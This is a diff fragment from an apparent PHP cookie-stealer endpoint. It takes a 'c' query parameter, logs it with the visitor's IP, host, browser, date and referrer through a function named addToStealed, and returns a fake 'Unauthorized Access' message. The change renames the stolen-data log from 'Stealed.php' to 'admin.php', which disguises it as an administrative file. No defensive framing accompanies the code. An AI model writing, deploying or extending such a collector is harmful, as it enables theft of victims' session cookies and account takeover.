@@ -46,6 +46,6 @@ Usage:
 	if(isset($_GET['c']))	$data	= $_GET['c'];
 	else 					$data	= 'No data';
 	
-	addToStealed("Stealed.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
+	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
 	echo "Unauthorized Access";
 ?>
